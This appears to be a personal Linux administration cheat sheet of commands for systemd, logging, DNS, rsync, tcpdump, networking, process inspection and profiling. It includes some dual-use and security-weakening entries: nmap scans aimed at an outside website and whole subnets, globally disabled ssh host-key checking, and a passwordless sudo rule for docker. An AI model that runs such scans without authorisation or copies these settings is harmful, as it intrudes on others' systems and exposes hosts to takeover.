ldd : print shared library dependencies

=====
boot-up:

run scripts at startup : put in /etc/rc.local
others:
/etc/init.d/rcS
run scripts in /etc/rc2.d, which links to /etc/init.d

create init-style startup script:
update-rc.d <name> defaults

read /etc/rc2.d/README

default runlevel in /etc/init/rc-sysinit.conf

#start service at boot-up:
update-rc.d SERVICENAME defaults

#remove service from start at boot-up
update-rc.d -f service_name remove

===================================
#ways to manage upstart/init job

upstart jobs are in /etc/init
initctl list : list upstart job

#1:
#start/stop upstart job
start/stop/status docker #as root

#2:
#service
service --status-all
service docker stop/start/restart

#3:
/etc/init.d/docker start/stop/status

#4:
invoke-rc.d docker status

#list all startup processes
initctl list
systemctl list-unit-files --state=enabled
service --status-all

The service command is a wrapper script that allows system administrators to start, stop, and check
the status of services without worrying too much about the actual init system being used. Prior to
systemd's introduction, it was a wrapper for /etc/init.d scripts and Upstart's initctl command, and
now it is a wrapper for these two and systemctl as well.

==================================

/etc/init/ttyN.conf : start a getty process for ttyN
stop tty6 : stop tty6

/etc/init/control-alt-delete.conf; define behavior for ctrl-alt-del

/var/log : lots of logs
/var/lib
/var/spool
/usr/share

/var/log/syslog
/var/log/auth.log #sudo log
/var/log/Xorg.0.log
/var/log/apport.log
/var/log/kern.log
/var/log/wtmp
/var/log/pm-powersave.log
/var/log/gpu-manager.log
/var/log/boot.log
/var/log/dmesg
/var/log/udev
/var/log/dpkg.log
/var/log/alternatives.log
/var/log/upstart/
/var/log/lightdm/

dig: DNS lookup utility
#reverse lookup
dig +short -x <ip addr>
dig @8.8.8.8 networkworld.com
dig networkworld.com +noall +answer
dig <hostname|ip> [type]
example: dig google.com MX
example: dig google.com AAAA
--
#get all info
dig google.com ANY
#get all info, easier to read
dig +multiline +noall +answer +nocmd google.com ANY
==
dig +trace google.com #trace dns path
--
dig: By default query is for A record
https://www.cyberciti.biz/faq/linux-unix-dig-command-examples-usage-syntax/
====
another DNS utility: drill
drill www.google.com
drill www.google.com @8.8.8.8
----
DNS lookup process:
dig @198.41.0.4 github.com #198.41.0.4 is a root dns server, ask root nameserver:
a.gtld-servers.net.     172800  IN      A       192.5.6.30
---
dig @192.5.6.30 github.com #ask .com nameserver about githumb.com:
ns-421.awsdns-52.com.   172800  IN      A       205.251.193.165
---
dig @205.251.193.165 github.com #Ask the github.com nameservers about github.com:
github.com.             60      IN      A       192.30.255.112
# 60 means TTL (time to live) is 60 seconds
---
#
dig without any argument will do "dig NS ." #show the NS record for root server
---
https://jvns.ca/blog/how-updating-dns-works/

#dns resolution:
systemd-resolve <hostname>

file copy tool: rsync

lsmod: list kernel module
modinfo: display module info
modules are in /lib/modules/
rmmod: remove modules
modprobe: add or remove modules
systool -v -m module_name #list options set for a loaded module
modprobe -c : show config
modprobe --show-depends module_name

--cron change
move popularity-contest from /etc/cron.daily to ~root/cron
move bsdmainutils from /etc/cron.daily to ~root/cron
move mlocate from /etc/cron.daily to /etc/cron.monthly
move locate from /etc/cron.daily to /etc/cron.monthly

--cron change 2015-01-16
change /etc/cron.daily/locate:
 add "/C /D /Data" to PRUNEPATHS
 add vboxsf to PRUNEFS

/etc/updatedb.conf:
   add /C to prunepaths
   add vboxsf to prunefs
DB: /var/lib/mlocate/mlocate.db

consider disabling mlocate cron job

anacron: for desktops and laptops that are not running 24/7
/var/spool/anacron
/etc/anacrontab

run-parts --report /etc/cron.daily

ufw - program for managing a netfilter firewall
ufw allow 22

sudo visudo #change /etc/sudoers file:
#allow user cheok to run docker without being prompted for the password
#sudo only ask for password per xterm session
added this line:
cheok ALL=(ALL) NOPASSWD: /usr/bin/docker

#swappiness
#the smaller the number, the less aggressive linux will swap
cat /proc/sys/vm/swappiness

/etc/sysctl.conf

iftop : display bandwidth usage on an interface by host
whois : client for the whois directory service

font cache commands:
fc-cache
fc-cat
fc-list
fc-match
fc-pattern
fc-query
fc-scan
fc-validate

fc : shell builtin that display and edits command
help fc : help is a shell builtin

#show distro info : LSB: linux standard base
--> lsb_release -a
output:
Distributor ID: Ubuntu
Description:    Ubuntu 14.10
Release:        14.10
Codename:       utopic

/etc/os-release

partprobe: inform the OS of partition table changes

commands:
lsattr
lsblk
lsb_release
lscpu
lsdiff
lshw
lsinitramfs
lslocks
lsmod
lsnrctl
lsof
lspci
lspcmcia
lspgpot
lsusb

initramfs: initial RAM-based filesystem: allow the kernel to execute programs before the root filesystem is mounted.
initrd: initial RAM disk: serves as a temporary root file system in RAM and allows the kernel to boot without
having to mount any physical disk.
---
initramfs: an archive of files (cpio format) that allows the kernel to boot before the root filesystem is mounted.

GRUB config:
make a copy of /etc/default/grub and /boot/grub/grub.cfg
1. change /etc/default/grub
GRUB_DEFAULT=saved
GRUB_SAVEDEFAULT=true
GRUB_GFXMODE=640x480
#supported resolution?: 640×480, 800×600, 1024×768, 1280×1024, 1600×1200
GRUB_CMDLINE_LINUX : Entries on this line are added to the end of the 'linux' command line (GRUB
legacy's "kernel" line) for both normal and recovery modes. It is used to pass options to the
kernel.
GRUB_CMDLINE_LINUX_DEFAULT: Entries on this line are added to the end of the 'linux' command line (GRUB
legacy's "kernel" line) for both normal mode only. It is used to pass options to the kernel.
2. run update-grub , this will change /boot/grub/grub.cfg
output of update-grub:
Found linux image: /boot/vmlinuz-3.16.0-30-generic
Found initrd image: /boot/initrd.img-3.16.0-30-generic
Found linux image: /boot/vmlinuz-3.16.0-23-generic
Found initrd image: /boot/initrd.img-3.16.0-23-generic
Found memtest86+ image: /boot/memtest86+.elf
Found memtest86+ image: /boot/memtest86+.bin
Found Windows 7 (loader) on /dev/sda2
===================================================
grub images: /usr/lib/grub/i386-pc

gfxmode:

If this variable is set, it sets the resolution used on the ‘gfxterm’ graphical terminal. Note that
you can only use modes which your graphics card supports via VESA BIOS Extensions (VBE), The default
is ‘auto’, which selects a platform-specific default that should look reasonable.
====
The resolution may be specified as a sequence of one or more modes, separated by commas (‘,’) or
semicolons (‘;’); each will be tried in turn until one is found. Each mode should be either ‘auto’,
‘widthxheight’, or ‘widthxheightxdepth’.

gfxpayload:

If this variable is set, it controls the video mode in which the Linux kernel starts up, replacing
the ‘vga=’ boot option. It may be set to ‘text’ to force the Linux kernel to boot in normal text
mode, ‘keep’ to preserve the graphics mode set using ‘gfxmode’, or any of the permitted values for
‘gfxmode’ to set a particular graphics mode (see gfxmode).

----------------------------------------------

uninstall a kernel image: apt-get remove linux-image-4.2.0-30-generic

/tmp cleanup, happen on reboot:
/etc/init/mounted-tmp.conf , which uses /etc/default/rcS , use TMPTIME var

#printf builtin (in bash):
$ printf "%d" "'a"
97
$ printf "%x" "'a"
61
'a -> convert a to its ascii code
#print unicode
printf "\u8a31\n"
or
printf "\U8A31\n"

need cifs-utils to access windows server, then do: sudo mount -t cifs -o username=heech //snt2/isdc ~/j

#add shared library path
option 1:
LD_LIBRARY_PATH is an environment variable you set to give the run-time shared library loader (ld.so) an extra set of directories to look for when searching for shared libraries
example: LD_LIBRARY_PATH=~/instantclient_11_2 python3
option 2:
 create a file under /etc/ld.so.conf.d/, then run ldconfig

##print shared libraries dependencies: ldd command

need instantclient-basic-linux.x64-11.2.0.3.0.zip instantclient-sdk-linux.x64-11.2.0.3.0.zip

add include and library path gcc:
C_INCLUDE_PATH=~/instantclient_11_2/sdk/include LIBRARY_PATH=~/instantclient_11_2 pip3 install --user cx_Oracle

special case (for npm oracledb only):
OCI_INC_DIR=~/instantclient_11_2/sdk/include LIBRARY_PATH=~/instantclient_11_2 npm install oracledb

#stop this message (when running evince): Couldn't connect to accessibility bus: Failed to connect to socket /tmp/dbus-sCAvokkUFt: Connection refused
export NO_AT_BRIDGE=1

rsync -avP userid@host:/path/to/file .
also: -z for compress
-P : preserve partially copied files, you can pick up where you left off
gotchas:
#1 Copy entire directory to remote parent directory:
rsync /path/without/slash host:/path/to/parent/with/slash/
------
#1a. dest does not exist
eg. rsync -av max tmp # same as rsync -av max tmp/
result: tmp is created and max is under tmp: tmp/max
diff -r max tmp/max #identical
#1b. dest exists
eg. rsync -av max tmp # same as rsync -av max tmp/
result: max is under tmp: tmp/max
diff -r max tmp/max #identical
---
#2 Copy contents of one directory to another:
rsync -r /path/to/directory/* host:/path/to/directory/
OR
# src will then match /media/heech/CHEOK/java/Playground/src
rsync -av src/* /media/heech/CHEOK/java/Playground/src
alternative: rsync -av src /media/heech/CHEOK/java/Playground
----
#2a. dest does not or does exist (dest dir is created if necessary)
eg rsync -av max/* tmp/ # same as rsync -av max/* tmp
diff -r max tmp #identical
----------
#3 Copy a directory into a new directory on another host:
rsync /path/without/slash host:/path/to/new/directory
#4 rsync file dirname #copy file to dirname/file
#5 rsync file dirname/filename #copy file to dirname/filename
#6 rsync file dirname/ #copy file to dirname/file, creating dirname if necessary
-----
dir has a file called a
#1: rsync dir dest_dir
    result: dest_dir/dir/a
#2: rsync dir/ dest_dir
    result: dest_dir/a

#cp
#1: dest is a directory -> make a copy with the same name in directory
#2: dest is not a directory -> make a copy with the specified path name.
===
rsync -avu a b/    #a and b are existing directory, same result as cp -r a b
rsync -avu a c     #a is a directory and c does not exist, will create c directory


#fast way to delete large number of files
mkdir empty && rsync -r --delete empty/ some-dir && rmdir empty

#sed: remove leading/trailing spaces from a file (in place)
sed -i -e 's/^[ \t]*//' -e 's/[ \t]*$//' <file>
sed -i 's/\x0d//' <file> #remove carriage return from a file (in place)

Replace text on commented lines
sed -n '/^\s*#/s/test/wow/p' blah.txt
Replace text, except on commented lines
sed -n '/^\s*#/!s/test/wow/p' blah.txt

#insert a file after a pattern
sed '/INCLUDE/ r foo.h' # insert foo.h after 'INCLUDE'

ls options:
--time-style=
full-iso
long-iso
iso
locale
+%H:%M:%S:%D

ls --format=across
# ls --format=comma
# ls --format=horizontal
# ls --format=long
# ls --format=single-column
# ls --format=verbose
# ls --format=vertical

ls --sort=extension
# ls --sort=size
# ls --sort=time
# ls --sort=version
# ls --sort=none

ip addr
route -n
/etc/network/interfaces
route add default gw 146.222.122.137

ls /sys/class/net/ to see network interfaces.

redirecting stdout and stderr:
&>word
>&word
the first one is preferred.
this is equivalent to >word 2>&1
--
pipe both standard output and standard error into the next stage of the pipeline: |&

#last reboot:
last reboot
#last shutdown entries:
last -x
last -x shutdown reboot

who -a or -b #show system boot info

ubuntu-drivers

#list file descriptors in kernel memory
sysctl fs.file-nr
#same as cat /proc/sys/fs/file-nr

#list max number of file descriptors
sysctl fs.file-max
#same as cat /proc/sys/fs/file-max

sysctl -a #show all values

#motd for ssh login
/var/run/motd.dynamic

because of the 3-way handshake, the kernel has two backlog queues for socket waiting for a connection:
listen syscall backlog parameter: the limit for the accept queue of incoming connections.
There are two queues: SYN queue and accept queue.
#1. when the server receives a SYN, the connection is in SYN-RECEIVED state, and it goes to the SYN queue.
#2. when the server receives a ACK, the connection is in ESTABLISHED state, and it goes to the accept queue.
#3. the application then has to call accept syscall to remove the connection from the accept queue.

net.core.somaxconn = 128
net.ipv4.tcp_max_syn_backlog = 512
somaxconn
1. Limit of socket listen() backlog,
2. limit for the accept queue
=================
tcp_max_syn_backlog
the limit for the SYN queue

#number of incoming connections backlog
net.core.netdev_max_backlog

netstat -ant | grep -c SYN_REC

tcp 3-way handshake
1. client send SYN to server (client in SYN-SENT state and server in SYN-RECEIVED state)
2. server send SYN-ACK to client
3. client send ACK to server (client and server in ESTABLISHED state)

calendar:
cal -y 2014
cal -3 #show prev, current, next months
cal -d 2014-07

envsubst: substitute environment variables
e.g:
echo "this is $HOME, wow" | envsubst
this is /home/heech, wow
"this is ${HOME}, wow" | envsubst
this is /home/heech, wow

#prevent ssh from asking you to add a host to known_hosts
#1: ssh-keyscan -H host >> ~/.ssh/known_hosts
#2: ssh -o StrictHostKeyChecking=no user@host  #ask for password
#3: change /etc/ssh/ssh_config:
Host *
   StrictHostKeyChecking no

mcli con
NAME                UUID                                  TYPE      DEVICE
Wired connection 1  0208ff0b-6c6e-343f-a129-3b3148d5161b  ethernet  eth1

nmcli dev
DEVICE  TYPE      STATE        CONNECTION
wlan0   wifi      connected    SCC_GUEST
eth1    ethernet  unavailable  --

nmcli dev show
GENERAL.DEVICE:                         wlan0
GENERAL.TYPE:                           wifi
GENERAL.HWADDR:                         00:26:C7:3A:5F:9C
GENERAL.MTU:                            1500
GENERAL.STATE:                          100 (connected)
GENERAL.CONNECTION:                     SCC_GUEST
GENERAL.CON-PATH:                       /org/freedesktop/NetworkManager/ActiveConnection/0
IP4.ADDRESS[1]:                         ip = 192.168.92.214/23, gw = 192.168.93.253
IP4.DNS[1]:                             209.244.0.3
IP4.DNS[2]:                             209.244.0.4
IP6.ADDRESS[1]:                         ip = fe80::226:c7ff:fe3a:5f9c/64, gw = ::

nmcli -f all dev show eth2
nmcli -f all dev show # show all devices
nmcli -p dev show eth2 #show DNS info
nmcli -f all g
nmcli c ->
NAME                UUID                                  TYPE             DEVICE
Wired connection 1  c614de98-714f-3f7a-8632-c47e53590cac  802-3-ethernet   eth2

/etc/NetworkManager/system-connections/Ipoh

#edit existing connection
nmcli c edit c614de98-714f-3f7a-8632-c47e53590cac
nmcli c show --active
nmcli c modify id 'MyCafe' 802-11-wireless.mtu 1350
===
nmtui
===
/var/lib/NetworkManager/dhclient-eth1.conf : contain hostname

find out my screen resolution:
#1: xdpyinfo | grep dimensions
#2: xrandr
show X db: xrdb -query

#change screen resolution
type xrandr to show available name for output and resolution:
++++++++++++++++++++
Screen 0: minimum 320 x 200, current 1920 x 1080, maximum 8192 x 8192
DIN disconnected (normal left inverted right x axis y axis)
DVI-0 connected 1920x1080+0+0 (normal left inverted right x axis y axis) 531mm x 299mm
   1920x1080      60.0*+
   1280x1024      75.0     60.0
   1152x864       75.0
   1024x768       75.1     60.0
   800x600        75.0     60.3
   640x480        75.0     60.0
   720x400        70.1
DVI-1 disconnected (normal left inverted right x axis y axis)
++++++++++++++++++++
change resolution:
xrandr --output DVI-0 --mode 1920x1080

#terminate the shell if no activity for 30 seconds
export TMOUT=30

#check if my machine is being pinged
tcpdump -ni eth2 icmp
#capture 2 packets and display packets n hex and ascii, write to a file, -tttt: print a timestamp
tcpdump -ni eth2 -c 2 -XX -w filename -tttt
# -n : do not resolve IP address, -X: display hex and ascii content, -S: show absolute sequence number
# -nn: do not resolve IP address or port number
# -XX: -X plus ethernet header
# -A : print in ascii only
tcpdump -nXS
# -D: show available interfaces
# -c : get x number of packets
# -s : show x bytes: -s 0 to show everything (default: 65535)
tcpdump -nn -XX -i eth2 -c 2 -s 0 -v icmp
tcpdump -nn -XX -i eth2 -c 2 -s 0 -v tcp
tcpdump -nn -XX -i eth2 -c 2 -s 0 -v udp
#
tcpdump -nn -XX -i eth2 -v host <ip>
tcpdump -nn -XX -i eth2 -v src <ip>
tcpdump -nn -XX -i eth2 -v dst <ip>
tcpdump -nn -XX -i eth2 -v net 1.2.3.0/24
tcpdump -nn -XX -i eth2 -v port 3389
tcpdump -nn -XX -i eth2 -v src port 3389
tcpdump -nn -XX -i eth2 -v dst port 3389
tcpdump src port 1025 and tcp
tcpdump portrange 21-23
#only see packets below or above a certain size (in bytes)
tcpdump less 32
tcpdump greater 128
===
tcpdump -nnvvS src 10.5.2.3 and dst port 3389
===
tcpdump 'src 10.0.2.4 and (dst port 3389 or 22)'
=== common use
tcpdump -nnXv -i eth2 host 146.222.121.69
tcpdump -nnAv -i eth2 host 146.222.121.69
=====
tcpdump -nnvvvA -i eth2 -w file.pcap host <ip>
=======
tcpdump broadcast/tcp/udp/icmp

#related to ulimit
/etc/security/limits.conf

useful shortcuts for top command:
1 : show individual cpu
z : highlight running processes
c : show absolute path of process

run with an empty environment: env -i

=== systemd ====
systemctl list-unit-files --type=service #equivalent to ls /etc/systemd/system/*.service and /lib/systemd/system/*.service
systemctl start/stop/enable/disable/restart/status/reload virtualbox
#systemctl enable/disable: Enables/disable a service to be started on bootup:
systemctl mask foo  #Prevent a service from starting dynamically or even manually unless unmasked:
systemctl is-enabled foo
systemctl is-active NetworkManager
=============

In systemd, a unit refers to any resource that the system knows how to operate on and manage.
https://www.digitalocean.com/community/tutorials/understanding-systemd-units-and-unit-files
--
systemd: each type of capability is called unit type. each specific capability is called unit.

A unit configuration file whose name ends in ".service" encodes information about a process
controlled and supervised by systemd.

a unit configuration file whose name ends in ".socket" encodes information about an IPC or network
socket or a file system FIFO controlled and supervised by systemd, for socket-based activation.

A unit configuration file whose name ends in ".target" encodes information about a target unit of
systemd, which is used for grouping units and as well-known synchronization points during start-up.

systemd static unit: installed as dependency. static units are those without an [Install] section.

In SysVinit, functionalities (services, processes, etc.) were organized in seven run-levels. Each
run-level was associated with a level of functionality. In systemd, target-units provide the same
functionality which the run-levels used to provide in the SysVinit.
--
#to see runlevel to target mapping
ls -l /lib/systemd/system/runlevel?.target
===
runlevel vs systemd target
0	Shutdown all services and power off the system	poweroff.target
1	Single user mode for maintenance and recovery. Only the root account is allowed to log in. Networking is not available in this mode.	rescue.target
2	Multiuser mode without networking.	multi-user.target
3	Multiuser mode with networking. All users can login and access CLI prompt. No Graphical user interface is available.	multi-user.target
4	User-defined mode. Users can customize this run-level. Both command line and GUI (graphic user interface) are available for customization.	multi-user.target
5	X11 GUI with networking. All users can login into the system	graphical.target
6	Shutdown all services and reboot the system.	reboot.target
===

Run level 3 is emulated by multi-user.target. Run level 5 is emulated by
graphical.target. runlevel3.target is a symbolic link to multi-user.target and runlevel5.target is a
symbolic link to graphical.target.
#You can switch to 'runlevel 5' by running
systemctl isolate graphical.target
systemctl set-default <name of target>.target
systemctl get-default
systemctl status
systemctl --failed
systemctl list-units
systemctl list-dependencies --reverse man-db.timer
systemctl -t service
systemctl status "*service"
systemctl -n0 status systemd-resolved #-n0: do not show journal entries
===
$ systemctl list-dependencies --reverse NetworkManager.service
NetworkManager.service
● ├─NetworkManager-wait-online.service
● └─multi-user.target
●   └─graphical.target
== means NetworkManager-wait-online.service waits for NetworkManager.service
===
#list services that wait for plymouth-quit-wait.service
systemctl list-dependencies --reverse plymouth-quit-wait.service
==
#list services that plymouth-quit-wait.service waits for
systemctl list-dependencies plymouth-quit-wait.service

systemctl list-timers
systemctl list-jobs
==============
/etc/systemd , /etc/systemd/system
/lib/systemd , /lib/systemd/system
defaults in /lib/systemd/system/
overrides in /etc/systemd/system/
--
override systemd unit files:
$ sudo systemctl edit man-db.timer
created: /etc/systemd/system/man-db.timer.d/override.conf
$ sudo systemctl edit --full man-db.timer
created: /etc/systemd/system/man-db.timer from /lib/systemd/system/man-db.timer
$ sudo systemctl revert man-db.timer #remove override
==============
journalctl: query the contents of systemd journal
example:
journalctl _COMM=crond --since "10:00" --until "11:00"
journalctl --since yesterday
journalctl -PID=<pid>
journalctl -p err #err log level: all log levels: emerg,alert,crit,err,warning,notice,info,debug
journalctl --no-pager
journalctl -o json #json format
journalctl --disk-usage
journalctl --vacuum-size=1G
journalctl --vacuum-time=1years
journalctl --vacuum-time=2d
journalctl --vacuum-time=2d --rotate
journalctl --rotate
journalctl -u lpd.service
journalctl -k #like dmesg
journalctl --utc
journalctl -b #most recent boot
journalctl -b -1 #with boot it
journalctl --list-boots
journalctl -b --unit systemd-journald
journalctl -u run-u57.service
journalctl -rb -1 #look at journals of last shutdown
journalctl -xb
timedatectl
timedatectl status
timedatectl timesync-status
timedatectl show-timesync
====
/lib/systemd/system/multi-user.target.wants/
/lib/systemd/system/reboot.target.wants/
/etc/systemd/system/multi-user.target.wants/

coredumpctl from systemd-coredump
bootctl - Control the firmware and boot manager settings
systemd-cgtop

== execute shell script at startup boot using systemd ==
https://linuxconfig.org/how-to-automatically-execute-shell-script-at-startup-boot-on-systemd-linux
1. create a file disk-space-check.service in /etc/systemd/system/
=== file
[Unit]
After=mysql.service

[Service]
ExecStart=/usr/local/bin/disk-space-check.sh

[Install]
WantedBy=default.target
===
note: After: means run our script after mysql has been started
2.
systemctl daemon-reload
systemctl enable my_systemd_script.service

xxd: make a hex dump

manipulate or dump object files: objcopy and objdump
objdump : display info from object file
nm: list symbols from object file
disassemble a binary: objdump -d /bin/ls #att syntax is the default
objdump -Mintel -d /bin/ls #intel syntax
objdump -d -S <binary> #disassemble and display corresponding source code
alternative for disassemble:
gdb -q <binary>
-> info functions #show all functions
-> disassemble <function name>
-> disassemble /m <function name> #display source code as well (if available)
--
objdump -p /bin/ls
objdump -p /bin/ls | grep NEEDED #list required shared libraries
compare to ldd /bin/ls
--
the objdump command is dumping what the program itself lists as libraries. However, the ldd utility
is listing which libraries ld.so would load. It follows the graph so that we can see what would be
loaded by those libraries at runtime.  Therefore, compared to the objdump command, ldd gives a much
better picture of what needs to be available at runtime.

get the list of loaded shared libraries of a running process:
cat /proc/<pid>/maps

readlink: follow symbolic link
readlink -e `which google-chrome`
/opt/google/chrome/google-chrome

== virtual console
tty1 through 6 : there is a getty process
To access virtual console from X11: Ctrl-Alt-F1 thru F6
Once in virtual console, can use Alt-F1 throu 6 to switch. can also use alt-lefarrow and alt-rightarrow to cycle

X11 is running on tty7

do it from a command line: chvt 1
== virtual console

keyboard related programs:
loadkeys
showkey

download a full website:
wget --random-wait -r -p -e robots=off -U mozilla www.example.com

pmap: show memory map of a process
pmap <pid> # the last line is the total memory footprint
pmap -x <pid>: last line
                     Kbytes     RSS
--> total kB         4515736  112748   40304
/proc/[pid]/statm:
  field #1: size, mapped to VIRT
  field #2: resident, mapped to RES
  field #3: share, mapped to SHR
  field #4: text, mapped to CODE
  field #5: lib , always 0
  field #6: data, mapped to DATA
  field #7: dt, always 0
/proc/[pid]/maps -> similar to output of pmap
/proc/[pid]/smaps
/proc/[pid]/status | grep Threads
/proc/[pid]/task/[threadid] #tgid is process id, pid is thread id
/proc/[pid]/comm : show program name
/proc/meminfo
smem program

#add new repo
#1: add key: apt-key add <key>
#2: add a file to /etc/apt/sources.list.d, call it something like docker.list

ps f : show process hierarchy
ps a : show processes owned by others
ps x : those without tty
ps u : user-friendly format
ps -L : show threads (LWP (lightweight process column))
ps m : show threads
ps m -o pid,tid,comm #show process and thread id
ps -fHU <username> : show processes of username in hierarchical form
ps -L -o tid,pid,ppid,state,euid,egid,sid,pgid,tpgid,command <pid>
ps -o nlwp <pid> #show number of lightweight processes
ps auxww : wide output

#show top processes sorted by memory usage
#ps: cmd show long form
#ps: comm show name only
ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%mem
#show top processes sorted by cpu usage
ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%cpu
#show top 10 processes sorted by cpu, then mem, refresh every 1 second
watch -n1 'ps -eo pid,ppid,comm,%mem,%cpu --sort="-%cpu,-%mem" | head'
#list process in a hierarchy
ps -e -o pid,args --forest

7z a -mhe=on -ppassword important.7z important.txt for-honey.txt

check battery:
upower -i /org/freedesktop/UPower/devices/battery_BAT0 # deprecated supposedly
OR
cat /sys/class/power_supply/BAT0/uevent

#take every 10th line from the file
awk '!(NR % 10)' test.txt

#find working directory of a running process
#1. pwdx <pid1> <pid2>
#2. lsof -p <pid> | grep cwd
#3. readlink -e /proc/<pid>/cwd

pv program: show progress of task

pkg-config: manage compile and link flags for libraries (intended to work with automake and autoconf.)
provide the necessary details for compiling and linking a program to a library.

#convert doc to various format
$ pandoc -t plain README.md
-f : specify input format
-t : specify output format
-o : write to a file
---
pandoc -s README.md #default output is html, -s: create <head>,<body>

#write a tab literal in Bash command line
$'\t'

#bash: create a string literal
$'..' : create a string with backslash-escaped characters.
example: $'\n\t'
hexadecimal: $'\xc2\xa3'
octal: $'\302\243'

$ ls -d .*
all files/directories that start with ., include . and ..
$ ls -d .[^.]*
all files/directories that start with ., exclude . and ..

---
autotools:
autogen.sh -> generate configure script
configure -> create a makefile

printer stuff:
system-config-printer
lpstat -d
======
#don't do remote admin
cupsctl --remote-admin # update /etc/cups/cupsd.conf
===========
localhost:631 #cups admin
===========
check printing error:
/var/log/cups/error_log
===
/etc/cups/ppd/ISD18.ppd
/etc/cups/printers.conf
====
AppSocket protocol: socket://host:9100
Internet printing protocol: port 631

UML: user mode linux
#1: create a .config file
1a. this is better
make ARCH=um defconfig
1b. may not work
make ARCH=um allnoconfig KCONFIG_ALLCONFIG=mini.config
#2: build it
make ARCH=um
#3: run it
./kernel ubda=Slamd64-12.1-root_fs mem=512m
#show config
./kernel --showconfig
====
linux kernel:
#takes current config (.config) and update it based on new kernel release
make oldconfig/silentoldconfig

verifying linux kernel signature:
$ xzcat linux-4.4.tar.xz | gpg --verify linux-4.4.tar.sign -
gpg: Signature made Sun 10 Jan 2016 03:09:18 PM PST using RSA key ID 00411886
gpg: Can't check signature: public key not found
$ gpg --keyserver hkp://keys.gnupg.net --recv-keys 00411886
gpg: requesting key 00411886 from hkp server keys.gnupg.net
gpg: keyserver timed out
gpg: keyserver receive failed: keyserver error

passing an environment to a process (one-off):
$ VAR=value ./test.sh
#note cannot do ./test.sh VAR=HI

#scan a port
nmap -p6000 localhost
#version scan
nmap -p7474 -sV localhost
#version scan and more, use this one
nmap -p7474 -A localhost
#check web server in use
nmap -p80 -sV www.google.com
#TCP SYN scan
nmap -p7474 -sS localhost
#
nmap -oA #output in 3 major formats
#OS detection
nmap -O <host>
#output scan in normal
nmap -oN <file>
#output scan in XML format
nmap -oX scandata.xml rigel
#discover all hosts in a network
nmap -sn 146.222.122.128/25
#get a list of hostname without pinging
nmap -sL 146.222.122.128/25
#typical usage: -T: speed template
nmap -T4 -A <ip>
--
nmap -sT -p- -Pn <hostname or IP>
====
nmap --top-ports 1000 -T4 -sC www.google.com

#make your script more robust
set -euo pipefail
---
set -o nounset #same as set -u
set -o errexit #same as set -e

#check dirty pages in page cache
$ cat /proc/meminfo | grep Dirty
Dirty:               204 kB
#flush system buffers
$ sync


As of 2.4 kernel, these two caches (page and buffer caches) have been combined. Today, there is only
one cache, the Page Cache
---
Buffers are in-memory block I/O buffers. They are relatively short-lived. Prior to Linux
kernel version 2.4, Linux had separate page and buffer caches. Since 2.4, the page and
buffer cache are unified and Buffers is raw disk blocks not represented in the page
cache—i.e., not file data. The Buffers metric is thus of minimal importance.


#I/O scheduler
cat /sys/block/sda/queue/scheduler
--> noop [deadline] cfq
CFQ : Completely Fair Queuing

#ulimit:
/etc/security/limits.conf

#run stress test
siege --log=siege.log -t5M -c 4 -i -b -f url.txt

tmux: from 2 horizontal panes to 2 vertical panes (and vice versa)
Prefix <SPC> : cycle through available layouts (bound to next-layout)
Prefix Alt-1 : even horizontal
Prefix Alt-2 : even vertical
Prefix Ctrl-o : rotate window
--
tmux set-option (alias: set)
Set a pane option with -p, a window option with -w, a server option with -s, otherwise a session
option. If -g is given, the global session or window option is set.

ssh X11 forwarding
want to display on my-machine (where X server is running)
remote (where client will be run)

On my-machine: ssh -X user@remote
OR ssh -Y user@remote

#check for CRLF ending:
$ file /a/tapasjo/copy-paste.txt
/a/tapasjo/copy-paste.txt: ASCII text, with CRLF line terminators
---
$ grep -c  $'\r' /a/tapasjo/copy-paste.txt
27

braces:
trimming with variable substitution:
$ var=foo.pdf
$ echo ${var%.pdf} #trim suffix
foo
${var%pattern}: remove shortest part of pattern
${var%%pattern}: remove longest part of pattern
==========================
$ echo ${var#foo} #trim prefix
.pdf
${var#Pattern}: remove shortest part of pattern
${var##Pattern} : remove longest part of pattern
example:
_url=http://dns.measurement-factory.com/tools/dnstop/src/dnstop-20090128.tar.gz
echo "${_url#*/}"
=> /dns.measurement-factory.com/tools/dnstop/src/dnstop-20090128.tar.gz
echo "${_url##*/}"
=> dnstop-20090128.tar.gz

variable substitution: substring
${parameter:offset}
${parameter:offset:length}
${variable:position}
var=${string:position}

variable substitution: find and replace
${varName/Pattern/Replacement}
${varName/word1/word2}
====
#parameter substitution:
IP=1.2.3.4
echo ${IP/./ }
1 2.3.4
echo ${IP//./ }
1 2 3 4
#an extra / means global substitution
====
curly brace expansion
$ echo {00..8..2}
00 02 04 06 08
$ echo {00..8}
00 01 02 03 04 05 06 07 08
$ echo {D..T..4}
D H L P T
$ echo {1..5} {10..15}
1 2 3 4 5 10 11 12 13 14 15

single bracket vs double bracket
single: POSIX
double: non-POSIX, only in bash, zsh, ksh
[ is a shell builtin and a program (/usr/bin/[
[[ is a keyword
=====
No WordSplitting or glob expansion will be done for [[ (and therefore many arguments need not be quoted):
eg.
 file="file name"
 [[ -f $file ]] && echo "$file is a regular file"
will work even though $file is not quoted and contains whitespace. With [ the variable needs to be quoted:
eg.
 file="file name"
 [ -f "$file" ] && echo "$file is a regular file"
This makes [[ easier to use and less error-prone.
------
Parentheses in [[ do not need to be escaped:
eg.
 [[ -f $file1 && ( -d $dir1 || -d $dir2 ) ]]
 [ -f "$file1" -a \( -d "$dir1" -o -d "$dir2" \) ]


profiling java program with perf:
#1. profiling: generate a file called perf.data
sudo perf record -F 99 -a -g sleep 30
OR
sudo perf record -F 99 -a -g -p PID sleep 30
#2. create method mappings : create a file called /tmp/perf-pid.map
    this file is used to translate memory address into function and variable names (used by perf report/script)
/home/heech/gitrepo/perf-map-agent/bin/create-java-perf-map.sh <pid>
#3. generate flame graph (need perf.data in current directory)
sudo perf script | ~/gitrepo/FlameGraph/stackcollapse-perf.pl | ~/gitrepo/FlameGraph/flamegraph.pl --color=java --hash > flamegraph.svg
# text report
sudo perf report --stdio
#ncurses window
sudo perf report
#list raw event
sudo script
===
#cpu counter stats
perf stat -a sleep 10
perf stat -ad sleep 3 #more details
perf stat -p <pid>
-- output of perf stat:
         40,126.72 msec cpu-clock                 #    3.999 CPUs utilized
             9,668      context-switches          #    0.241 K/sec
               890      cpu-migrations            #    0.022 K/sec
               346      page-faults               #    0.009 K/sec
     3,002,189,503      cycles                    #    0.075 GHz                      (83.31%)
     4,381,985,093      stalled-cycles-frontend   #  145.96% frontend cycles idle     (83.32%)
     3,238,160,342      stalled-cycles-backend    #  107.86% backend cycles idle      (66.69%)
